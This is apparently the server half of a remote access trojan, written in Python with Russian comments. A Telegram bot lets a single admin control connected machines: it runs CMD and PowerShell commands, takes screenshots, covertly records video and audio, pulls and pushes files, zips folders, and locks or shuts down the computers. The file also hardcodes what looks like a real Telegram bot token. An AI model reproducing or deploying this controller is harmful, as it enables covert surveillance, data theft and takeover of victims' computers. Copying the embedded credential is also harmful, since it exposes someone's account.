import telebot
import socket
import threading
import json
import time
import os
from queue import Queue

TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"
SERVER_PORT = 5678
ADMIN_ID = 6330090175  # Ваш ID в Telegram

# Глобальные переменные
clients = {}  # {device_name: socket}
command_queues = {}  # {device_name: Queue}
active_connections = {}
bot = telebot.TeleBot(TOKEN)

def start_command_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', SERVER_PORT))
        s.listen(5)
        print(f"Сервер слушает порт {SERVER_PORT}")
        
        while True:
            conn, addr = s.accept()
            device_name = conn.recv(1024).decode()
            print(f"Подключено: {device_name} ({addr[0]})")
            
            clients[device_name] = conn
            command_queues[device_name] = Queue()
            active_connections[device_name] = conn
            
            # Запускаем обработчик для устройства
            client_thread = threading.Thread(
                target=handle_client_connection, 
                args=(device_name, conn),
                daemon=True
            )
            client_thread.start()

def handle_client_connection(device_name, conn):
    while True:
        try:
            # Проверяем очередь команд
            if not command_queues[device_name].empty():
                user_id, command, file_info = command_queues[device_name].get()
                
                # Отправляем команду клиенту
                conn.sendall(json.dumps(command).encode())
                
                # Обработка файловых операций
                if command.get('type') in ['download_file', 'video', 'audio']:
                    # Ожидаем начало передачи файла
                    response = conn.recv(1024)
                    
                    if response == b"FILE_TRANSFER_START":
                        file_path = file_info['path']
                        with open(file_path, 'wb') as f:
                            while True:
                                data = conn.recv(4096)
                                if not data:
                                    break
                                f.write(data)
                        
                        # Отправляем файл пользователю
                        with open(file_path, 'rb') as f:
                            if command['type'] == 'video':
                                bot.send_video(user_id, f, caption=f"Видео с {device_name}")
                            elif command['type'] == 'audio':
                                bot.send_audio(user_id, f, caption=f"Аудио с {device_name}")
                            else:
                                bot.send_document(user_id, f, caption=f"Файл с {device_name}")
                        os.remove(file_path)
                        continue
                
                # Получаем текстовый ответ
                response = conn.recv(4096).decode()
                bot.send_message(user_id, f"📋 Ответ от {device_name}:\n```\n{response}\n```", parse_mode="Markdown")
                
        except Exception as e:
            print(f"Ошибка соединения с {device_name}: {e}")
            del clients[device_name]
            del command_queues[device_name]
            del active_connections[device_name]
            conn.close()
            break

@bot.message_handler(commands=['start', 'help'])
def send_help(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    help_text = """
    🖥️ *Управление устройствами*
    
    /devices - Список устройств
    /help - Справка
    
    ⚙️ *Команды (после выбора устройства)*:
    /cmd [команда] - Выполнить CMD
    /ps [команда] - PowerShell
    /screenshot - Скриншот
    /video [60] - Запись видео (60 сек по умолч.)
    /audio [60] - Запись звука
    /sysinfo - Информация о системе
    /lock - Блокировка ПК
    /shutdown - Выключение
    /restart - Перезагрузка
    /files [путь] - Список файлов
    /download [путь] - Скачать файл
    /upload [путь] - Загрузить файл
    /zip [папка] - Архивировать папку
    """
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['devices'])
def list_devices(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    if not clients:
        bot.send_message(message.chat.id, "❌ Устройства не подключены")
        return
    
    devices = "\n".join([f"🔹 {device}" for device in clients.keys()])
    bot.send_message(message.chat.id, f"📱 *Подключенные устройства:*\n{devices}", parse_mode="Markdown")
    
    # Сохраняем список устройств для последующего выбора
    bot.register_next_step_handler(message, select_device)

def select_device(message):
    device_name = message.text.strip()
    if device_name in clients:
        bot.send_message(
            message.chat.id, 
            f"✅ Выбрано устройство: {device_name}\nТеперь отправьте команду",
            reply_markup=get_command_keyboard()
        )
        # Сохраняем выбор устройства
        bot.register_next_step_handler_by_chat_id(message.chat.id, handle_command, device_name)
    else:
        bot.send_message(message.chat.id, "❌ Устройство не найдено")
        list_devices(message)

def handle_command(message, device_name):
    if message.from_user.id != ADMIN_ID:
        return
    
    text = message.text.strip()
    
    # Определяем тип команды
    command = {"type": "cmd"}
    file_info = {}
    
    if text.startswith('/cmd '):
        command = {"type": "cmd", "command": text[5:]}
    
    elif text.startswith('/ps '):
        command = {"type": "powershell", "command": text[4:]}
    
    elif text.startswith('/screenshot'):
        command = {"type": "screenshot"}
    
    elif text.startswith('/video'):
        duration = 60
        if ' ' in text:
            try:
                duration = int(text.split(' ')[1])
            except:
                pass
        command = {"type": "video", "duration": duration}
        file_info = {"path": f"{device_name}_video.mp4"}
    
    elif text.startswith('/audio'):
        duration = 60
        if ' ' in text:
            try:
                duration = int(text.split(' ')[1])
            except:
                pass
        command = {"type": "audio", "duration": duration}
        file_info = {"path": f"{device_name}_audio.wav"}
    
    elif text.startswith('/sysinfo'):
        command = {"type": "sysinfo"}
    
    elif text.startswith('/lock'):
        command = {"type": "lock"}
    
    elif text.startswith('/shutdown'):
        command = {"type": "shutdown"}
    
    elif text.startswith('/restart'):
        command = {"type": "restart"}
    
    elif text.startswith('/files'):
        path = '.' if ' ' not in text else text.split(' ', 1)[1]
        command = {"type": "list_files", "path": path}
    
    elif text.startswith('/download'):
        path = text.split(' ', 1)[1] if ' ' in text else ''
        command = {"type": "download_file", "path": path}
        file_info = {"path": f"{device_name}_{os.path.basename(path)}"}
    
    elif text.startswith('/upload'):
        # Здесь нужна дополнительная логика для приема файла
        bot.send_message(message.chat.id, "Отправьте файл для загрузки")
        bot.register_next_step_handler(
            message, 
            receive_upload_file, 
            device_name, 
            text.split(' ', 1)[1] if ' ' in text else '.'
        )
        return
    
    elif text.startswith('/zip'):
        folder = text.split(' ', 1)[1] if ' ' in text else '.'
        command = {"type": "zip_folder", "path": folder}
    
    # Добавляем команду в очередь устройства
    command_queues[device_name].put((message.chat.id, command, file_info))
    bot.send_message(message.chat.id, f"⌛ Команда отправлена на {device_name}...")

def receive_upload_file(message, device_name, path):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_name = message.document.file_name
            save_path = f"uploads/{device_name}_{file_name}"
            
            with open(save_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            # Отправляем команду на загрузку файла на устройство
            command = {
                "type": "upload_file",
                "path": os.path.join(path, file_name)
            }
            file_info = {"path": save_path}
            
            command_queues[device_name].put((message.chat.id, command, file_info))
            bot.send_message(message.chat.id, f"⌛ Файл отправляется на {device_name}...")
        
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
    else:
        bot.send_message(message.chat.id, "❌ Пожалуйста, отправьте файл")

def get_command_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('/screenshot', '/video 60', '/audio 60')
    markup.row('/sysinfo', '/lock', '/shutdown')
    markup.row('/files', '/download', '/upload')
    markup.row('/devices', '/help')
    return markup

if __name__ == "__main__":
    # Создаем папку для загрузок
    os.makedirs("uploads", exist_ok=True)
    
    # Запускаем сервер в отдельном потоке
    server_thread = threading.Thread(target=start_command_server, daemon=True)
    server_thread.start()
    
    # Запускаем бота
    bot.infinity_polling()
